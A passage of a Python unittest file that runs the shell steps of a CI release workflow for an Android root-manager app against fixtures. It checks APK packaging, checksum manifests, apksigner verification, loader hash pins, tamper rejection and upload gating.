            with self.subTest(mutation=f"drop {fragment}"):
                mutated = gradle.replace(fragment, "", 1)
                self.assertNotEqual(mutated, gradle)
                with self.assertRaisesRegex(AssertionError, "exactly one"):
                    assert_loader_keep_debug_symbols(mutated)
        typo = gradle.replace(
            'keepDebugSymbols += "**/libksudnext.so"',
            'keepDebugSymbols += "**/libksudnextt.so"',
            1,
        )
        self.assertNotEqual(typo, gradle)
        with self.assertRaisesRegex(AssertionError, "exactly one"):
            assert_loader_keep_debug_symbols(typo)

    def test_comment_stripping_is_block_scalar_aware(self) -> None:
        sample = (
            "jobs:\n"
            "  x:\n"
            "    steps:\n"
            "      - name: script with shell quote and shell comment\n"
            "        run: |\n"
            '          echo "unterminated shell quote\n'
            "          # this is shell, not YAML: continue-on-error: true\n"
            "          echo done\n"
            "      - name: next step # yaml comment\n"
            "        uses: actions/checkout@v7 # pinned later\n"
            "        continue-on-error: true\n"
        )
        active = strip_yaml_comments(sample)
        self.assertIn('echo "unterminated shell quote', active)
        self.assertIn("# this is shell, not YAML: continue-on-error: true", active)
        self.assertNotIn("# yaml comment", active)
        self.assertNotIn("# pinned later", active)
        # The shell comment is preserved but is not treated as a YAML key; the
        # real YAML key after the run block is still caught.
        with self.assertRaisesRegex(AssertionError, "continue-on-error"):
            assert_no_continue_on_error(active)
        assert_no_continue_on_error(strip_yaml_comments(sample.replace("        continue-on-error: true\n", "")))


class BehavioralScriptTests(unittest.TestCase):
    """Execute the exact scripts extracted from the workflow against fixtures."""

    @classmethod
    def setUpClass(cls) -> None:
        raw = WORKFLOW.read_text(encoding="utf-8")
        validate_workflow(raw)
        jobs = job_blocks(strip_yaml_comments(raw))
        cls.package_script = run_script(named_step(jobs["build-release"], "Package signed release APK"))
        cls.publisher_script = run_script(named_step(jobs["publish"], "Verify release checksum"))
        cls.verify_script = run_script(named_step(jobs["build-release"], "Verify signed release APK"))
        cls.counter_script = run_script(named_step(jobs["build-dfroot"], APK_COUNTER_COMMAND))
        cls.all_markers_script = run_script(named_step(jobs[HOST_GATES_JOB], ALL_MARKERS_STEP))
        cls.junit_script = run_script(named_step(jobs[HOST_GATES_JOB], JUNIT_STEP))
        cls.cache_assert_script = run_script(named_step(jobs["build-release"], CI_CACHE_ASSERT_STEP))
        cls.apk_loader_gate_script = run_script(named_step(jobs["build-release"], APK_LOADER_GATE_STEP))
        cls.choke_script = run_script(named_step(jobs["build-release"], UPLOAD_CHOKE_STEP))

    def test_package_script_requires_exactly_one_release_apk(self) -> None:
        for label, names in (("zero", []), ("multiple", ["DFRoot_a.apk", "DFRoot_b.apk"])):
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                write_release_apks(root, names)
                result = run_in_dir(self.package_script, root)
                self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertIn("Expected exactly one release APK", result.stderr)

    def test_package_script_writes_matching_checksum_and_replaces_stale_one(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_one.apk"])
            write_license_assets(root)
            apk = root / "app/build/outputs/apk/release/DFRoot_one.apk"
            stale = root / "release/DFRoot_one.apk.sha256"
            stale.parent.mkdir(parents=True)
            stale.write_text("STALE CHECKSUM\n", encoding="utf-8")

            result = run_in_dir(self.package_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            packaged = root / "release/DFRoot_one.apk"
            self.assertEqual(packaged.read_bytes(), apk.read_bytes())
            expected = hashlib.sha256(apk.read_bytes()).hexdigest() + "  DFRoot_one.apk\n"
            self.assertEqual(stale.read_text(encoding="utf-8"), expected)

    def test_package_script_conveys_license_and_notice_assets(self) -> None:
        """The signed release package must include all four licence files."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_signed.apk"])
            contents = write_license_assets(root)

            result = run_in_dir(self.package_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            for name, data in contents.items():
                with self.subTest(asset=name):
                    self.assertEqual((root / "release" / name).read_bytes(), data)

    def test_publisher_checksum_script_accepts_one_valid_pair(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_dist(root, ["DFRoot_ok.apk"])
            result = run_in_dir(self.publisher_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_publisher_checksum_script_rejects_zero_multiple_and_mismatch(self) -> None:
        with self.subTest(fixture="zero"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "dist").mkdir()
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one release APK and checksum", result.stderr)

        with self.subTest(fixture="multiple"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_dist(root, ["DFRoot_a.apk", "DFRoot_b.apk"])
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one release APK and checksum", result.stderr)

        with self.subTest(fixture="filename mismatch"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_a.apk"])
            (dist / "DFRoot_a.apk.sha256").rename(dist / "DFRoot_b.apk.sha256")
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Checksum filename does not match", result.stderr)

        with self.subTest(fixture="digest mismatch"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_a.apk"])
            (dist / "DFRoot_a.apk.sha256").write_text(
                "0" * 64 + "  DFRoot_a.apk\n", encoding="utf-8"
            )
            result = run_in_dir(self.publisher_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("FAILED", result.stdout + result.stderr)

    def test_publisher_checksum_script_rejects_unrelated_file_entry(self) -> None:
        """R7: a valid digest for an unrelated file must not verify the APK."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_ok.apk"])
            notice = dist / "NOTICE"
            notice.write_bytes(b"unrelated notice payload\n")
            notice_digest = hashlib.sha256(notice.read_bytes()).hexdigest()
            (dist / "DFRoot_ok.apk.sha256").write_text(
                f"{notice_digest}  NOTICE\n", encoding="utf-8"
            )

            result = run_in_dir(self.publisher_script, root)

            self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn(
                "Checksum manifest filename does not match the release APK",
                result.stderr,
            )

    def test_publisher_checksum_script_rejects_extra_entries(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_ok.apk"])
            digest = hashlib.sha256((dist / "DFRoot_ok.apk").read_bytes()).hexdigest()
            valid = f"{digest}  DFRoot_ok.apk\n"
            cases = {
                "second valid line": valid + f"{'b' * 64}  UNRELATED.txt\n",
                "trailing blank line": valid + "\n",
            }
            for label, content in cases.items():
                with self.subTest(fixture=label):
                    (dist / "DFRoot_ok.apk.sha256").write_text(content, encoding="utf-8")
                    result = run_in_dir(self.publisher_script, root)
                    self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                    self.assertIn("Expected exactly one checksum line", result.stderr)

    def test_publisher_checksum_script_rejects_malformed_entries(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dist = write_dist(root, ["DFRoot_ok.apk"])
            digest = hashlib.sha256((dist / "DFRoot_ok.apk").read_bytes()).hexdigest()
            malformed = "Malformed checksum line for the release APK"
            mismatched = "Checksum manifest filename does not match the release APK"
            cases = {
                "non-hex digest": ("g" * 64 + "  DFRoot_ok.apk\n", malformed),
                "uppercase digest": ("A" * 64 + "  DFRoot_ok.apk\n", malformed),
                "missing separator": (digest + "DFRoot_ok.apk\n", malformed),
                "path-prefixed name": (digest + "  dist/DFRoot_ok.apk\n", mismatched),
                "trailing-space name": (digest + "  DFRoot_ok.apk \n", mismatched),
            }
            for label, (content, message) in cases.items():
                with self.subTest(fixture=label):
                    (dist / "DFRoot_ok.apk.sha256").write_text(content, encoding="utf-8")
                    result = run_in_dir(self.publisher_script, root)
                    self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                    self.assertIn(message, result.stderr)

    def test_package_and_publisher_scripts_round_trip(self) -> None:
        """The package script's text-mode manifest is accepted by the publisher."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_roundtrip.apk"])
            write_license_assets(root)

            packaged = run_in_dir(self.package_script, root)
            self.assertEqual(packaged.returncode, 0, packaged.stdout + packaged.stderr)

            dist = root / "dist"
            dist.mkdir()
            for asset in (root / "release").iterdir():
                shutil.copy2(asset, dist / asset.name)

            result = run_in_dir(self.publisher_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_verify_script_invokes_real_apksigner_and_propagates_failure(self) -> None:
        for label, exit_code, expected_rc in (("success", 0, 0), ("failure", 1, 1)):
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                write_release_apks(root, ["DFRoot_signed.apk"])
                sdk, log = make_fake_sdk(root, exit_code)
                result = run_in_dir(
                    self.verify_script,
                    root,
                    {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)},
                )
                self.assertTrue(log.exists(), "apksigner was never invoked: " + result.stdout + result.stderr)
                self.assertEqual(
                    log.read_text(encoding="utf-8").splitlines(),
                    ["verify", "--verbose", "--print-certs", "app/build/outputs/apk/release/DFRoot_signed.apk"],
                )
                if expected_rc == 0:
                    self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                else:
                    self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_verify_script_rejects_zero_multiple_and_missing_apksigner(self) -> None:
        with self.subTest(fixture="zero"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, [])
            sdk, log = make_fake_sdk(root, 0)
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)})
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse(log.exists())

        with self.subTest(fixture="multiple"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_a.apk", "DFRoot_b.apk"])
            sdk, log = make_fake_sdk(root, 0)
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk), "APKSIGNER_LOG": str(log)})
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse(log.exists())

        with self.subTest(fixture="missing apksigner"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_a.apk"])
            sdk = root / "sdk"
            sdk.mkdir()
            result = run_in_dir(self.verify_script, root, {"ANDROID_HOME": str(sdk)})
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("apksigner was not found", result.stderr)

    def test_preupload_apk_counter_requires_exactly_one_debug_apk(self) -> None:
        with self.subTest(fixture="one debug"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_debug_apks(root, ["DFRoot_d.apk"])
            # A stray release APK is deliberately ignored: PR CI publishes no
            # release variant and must not be tricked into counting one.
            write_release_apks(root, ["DFRoot_r.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

        with self.subTest(fixture="missing libbootstrap.so"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_debug_apks(root, ["DFRoot_d.apk"], with_bootstrap=False)
            result = run_in_dir(self.counter_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("missing lib/arm64-v8a/libbootstrap.so", result.stdout + result.stderr)

        with self.subTest(fixture="zero debug"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_release_apks(root, ["DFRoot_r.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one debug APK", result.stderr)

        with self.subTest(fixture="multiple debug"), tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_debug_apks(root, ["DFRoot_d.apk", "DFRoot_d2.apk"])
            result = run_in_dir(self.counter_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Expected exactly one debug APK", result.stderr)

    def test_all_suites_marker_gate_fails_if_any_suite_is_missing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            for marker in HOST_SUITE_MARKERS:
                (runner_temp / marker).write_text("ok\n", encoding="utf-8")
            result = run_in_dir(self.all_markers_script, root, {"RUNNER_TEMP": str(runner_temp)})
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn("7/7 markers", result.stdout)

            for missing in HOST_SUITE_MARKERS:
                with self.subTest(missing=missing):
                    (runner_temp / missing).unlink()
                    result = run_in_dir(self.all_markers_script, root, {"RUNNER_TEMP": str(runner_temp)})
                    self.assertNotEqual(result.returncode, 0)
                    self.assertIn(f"Test suite marker missing: {missing}", result.stdout + result.stderr)
                    (runner_temp / missing).write_text("ok\n", encoding="utf-8")

            with self.subTest(missing="empty marker"):
                (runner_temp / HOST_SUITE_MARKERS[0]).write_text("", encoding="utf-8")
                result = run_in_dir(self.all_markers_script, root, {"RUNNER_TEMP": str(runner_temp)})
                self.assertNotEqual(result.returncode, 0)
                self.assertIn(f"Test suite marker missing: {HOST_SUITE_MARKERS[0]}", result.stdout + result.stderr)

    def test_junit_xml_gate_accepts_only_39_clean_tests(self) -> None:
        def write_report(root: Path, tests: int, failures: int = 0, errors: int = 0, skipped: int = 0) -> None:
            report = root / "app/build/test-results/testDebugUnitTest/TEST-Preferences.xml"
            report.parent.mkdir(parents=True, exist_ok=True)
            report.write_text(
                f'<testsuite name="Preferences" tests="{tests}" failures="{failures}" '
                f'errors="{errors}" skipped="{skipped}"></testsuite>\n',
                encoding="utf-8",
            )

        cases = (
            ("39 clean", (39, 0, 0, 0), True, ""),
            ("35 tests", (35, 0, 0, 0), False, "JUnit XML assertion failed"),
            ("one failure", (39, 1, 0, 0), False, "JUnit XML assertion failed"),
            ("one error", (39, 0, 1, 0), False, "JUnit XML assertion failed"),
            ("one skip", (39, 0, 0, 1), False, "JUnit XML assertion failed"),
        )
        for label, counts, passes, message in cases:
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                runner_temp = root / "runner-temp"
                runner_temp.mkdir()
                write_report(root, *counts)
                result = run_in_dir(self.junit_script, root, {"RUNNER_TEMP": str(runner_temp)})
                if passes:
                    self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                    self.assertIn("TOTAL tests=39 failures=0 errors=0 skipped=0", result.stdout)
                    self.assertTrue((runner_temp / "marker-junit").is_file())
                else:
                    self.assertNotEqual(result.returncode, 0)
                    self.assertIn(message, result.stdout + result.stderr)
                    self.assertFalse((runner_temp / "marker-junit").exists())

        with self.subTest(fixture="no XML"), tempfile.TemporaryDirectory() as tmp:
            runner_temp = Path(tmp) / "runner-temp"
            runner_temp.mkdir()
            result = run_in_dir(self.junit_script, Path(tmp), {"RUNNER_TEMP": str(runner_temp)})
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("No JUnit XML found", result.stdout + result.stderr)

    def test_cache_assertion_gate_rejects_skip_on_in_any_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cache_dir = root / "app/.cxx/arm64"
            cache_dir.mkdir(parents=True)
            cache = cache_dir / "CMakeCache.txt"
            cache.write_text("DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF\n", encoding="utf-8")
            result = run_in_dir(self.cache_assert_script, root)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

            cache.write_text("DFROOT_SKIP_KO_HASH_CHECK:BOOL=ON\n", encoding="utf-8")
            result = run_in_dir(self.cache_assert_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("DFROOT_SKIP_KO_HASH_CHECK is not OFF", result.stdout + result.stderr)

            cache.unlink()
            result = run_in_dir(self.cache_assert_script, root)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("No CMakeCache.txt found", result.stdout + result.stderr)

    def test_apk_loader_gate_accepts_good_archive_and_binds_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            pins = write_loader_gate_fixture(root)
            result = run_in_dir(self.apk_loader_gate_script, root, {"RUNNER_TEMP": str(runner_temp)})
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

            index = runner_temp / APK_LOADER_GATE_INDEX
            rows = [line.split("\t") for line in index.read_text(encoding="utf-8").splitlines()]
            self.assertEqual(len(rows), 1, rows)
            name, apk_sha, ksud_sha, next_sha, manifest = rows[0]
            self.assertEqual(name, "DFRoot_loader.apk")
            self.assertEqual(
                apk_sha, hashlib.sha256((root / "release" / name).read_bytes()).hexdigest()
            )
            self.assertEqual(ksud_sha, pins["ksud_sha256"])
            self.assertEqual(next_sha, pins["ksudnext_sha256"])

            fields = dict(
                line.split(": ", 1)
                for line in Path(manifest).read_text(encoding="utf-8").splitlines()
                if ": " in line
            )
            self.assertEqual(fields["status"], "verified")
            for field, key in (
                ("ksud_sha256", "ksud_sha256"),
                ("ksud_size", "ksud_size"),
                ("ksudnext_sha256", "ksudnext_sha256"),
                ("ksudnext_size", "ksudnext_size"),
            ):
                self.assertEqual(fields[field], pins[key])
            self.assertTrue((runner_temp / "dfroot-loader-1.verified").is_file())

            pin_rows = dict(
                line.split("\t")
                for line in (runner_temp / LOADER_PINS_FILE).read_text(encoding="utf-8").splitlines()
            )
            self.assertEqual(pin_rows, pins)

    def test_apk_loader_gate_rejects_tampered_same_size_loader(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            write_loader_gate_fixture(root, mode="tampered")
            result = run_in_dir(self.apk_loader_gate_script, root, {"RUNNER_TEMP": str(runner_temp)})
            combined = result.stdout + result.stderr
            self.assertNotEqual(result.returncode, 0, combined)
            self.assertIn("SHA-256 MISMATCH", combined)
            self.assertEqual((runner_temp / APK_LOADER_GATE_INDEX).read_text(encoding="utf-8").strip(), "")
            self.assertFalse((runner_temp / "dfroot-loader-1.manifest").exists())
            self.assertFalse((runner_temp / "dfroot-loader-1.verified").exists())

    def test_apk_loader_gate_rejects_missing_and_wrong_abi_entries(self) -> None:
        for mode in ("missing", "wrong-abi"):
            with self.subTest(mode=mode), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                runner_temp = root / "runner-temp"
                runner_temp.mkdir()
                write_loader_gate_fixture(root, mode=mode)
                result = run_in_dir(self.apk_loader_gate_script, root, {"RUNNER_TEMP": str(runner_temp)})
                combined = result.stdout + result.stderr
                self.assertNotEqual(result.returncode, 0, combined)
                self.assertIn("exactly one", combined)
                self.assertEqual((runner_temp / APK_LOADER_GATE_INDEX).read_text(encoding="utf-8").strip(), "")
                self.assertFalse((runner_temp / "dfroot-loader-1.manifest").exists())

    def test_apk_loader_gate_removes_stale_manifest_and_stamp_on_failure(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            write_loader_gate_fixture(root, mode="tampered")
            manifest = runner_temp / "dfroot-loader-1.manifest"
            stamp = runner_temp / "dfroot-loader-1.verified"
            manifest.write_text("status: verified\nstale loader evidence\n", encoding="utf-8")
            stamp.write_text("verified stale evidence\n", encoding="utf-8")

            result = run_in_dir(self.apk_loader_gate_script, root, {"RUNNER_TEMP": str(runner_temp)})
            self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertFalse(manifest.exists(), "stale verified manifest survived a failing run")
            self.assertFalse(stamp.exists(), "stale verified stamp survived a failing run")
            self.assertEqual((runner_temp / APK_LOADER_GATE_INDEX).read_text(encoding="utf-8").strip(), "")

    def test_apk_loader_gate_fails_when_a_reviewed_pin_is_edited(self) -> None:
        cases = (
            ("malformed pin", {"ksud_sha256": "deadbeef"}, "Malformed LOADER_KSUD_SHA256 pin"),
            ("wrong well-formed pin", {"ksud_sha256": "0" * 64}, "SHA-256 MISMATCH"),
        )
        for label, overrides, message in cases:
            with self.subTest(fixture=label), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                runner_temp = root / "runner-temp"
                runner_temp.mkdir()
                write_loader_gate_fixture(root, pin_overrides=overrides)
                result = run_in_dir(self.apk_loader_gate_script, root, {"RUNNER_TEMP": str(runner_temp)})
                combined = result.stdout + result.stderr
                self.assertNotEqual(result.returncode, 0, combined)
                self.assertIn(message, combined)
                # A malformed pin is rejected before the index is even created.
                index = runner_temp / APK_LOADER_GATE_INDEX
                self.assertTrue(
                    not index.exists() or index.read_text(encoding="utf-8").strip() == ""
                )
                self.assertFalse((runner_temp / "dfroot-loader-1.manifest").exists())

    def test_upload_choke_point_blocks_release_without_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            for marker in (*RELEASE_GATE_MARKERS, "marker-distributable-evidence"):
                (runner_temp / marker).write_text("ok\n", encoding="utf-8")
            index = runner_temp / RELEASE_GATE_INDEX
            index.write_text("DFRoot_a.apk\tsha\tso\tmanifest\tso_sha\n", encoding="utf-8")
            loader_index = runner_temp / APK_LOADER_GATE_INDEX
            loader_index.write_text("DFRoot_a.apk\tsha\tksud\tnext\tmanifest\n", encoding="utf-8")
            result = run_in_dir(self.choke_script, root, {"RUNNER_TEMP": str(runner_temp)})
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn("3/3 markers", result.stdout)
            self.assertIn("KO/loader indexes", result.stdout)

            for missing in RELEASE_GATE_MARKERS:
                with self.subTest(marker=missing):
                    (runner_temp / missing).unlink()
                    result = run_in_dir(self.choke_script, root, {"RUNNER_TEMP": str(runner_temp)})
                    self.assertNotEqual(result.returncode, 0)
                    self.assertIn(f"Distributable evidence marker missing: {missing}", result.stdout + result.stderr)
                    (runner_temp / missing).write_text("ok\n", encoding="utf-8")

            with self.subTest(fixture="empty index"):
                index.write_text("", encoding="utf-8")
                result = run_in_dir(self.choke_script, root, {"RUNNER_TEMP": str(runner_temp)})
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("APK gate index is empty or missing", result.stdout + result.stderr)
                index.write_text("DFRoot_a.apk\tsha\tso\tmanifest\tso_sha\n", encoding="utf-8")

            with self.subTest(fixture="missing loader index"):
                loader_index.unlink()
                result = run_in_dir(self.choke_script, root, {"RUNNER_TEMP": str(runner_temp)})
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("APK loader index is empty or missing", result.stdout + result.stderr)

            with self.subTest(fixture="empty loader index"):
                loader_index.write_text("", encoding="utf-8")
                result = run_in_dir(self.choke_script, root, {"RUNNER_TEMP": str(runner_temp)})
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("APK loader index is empty or missing", result.stdout + result.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
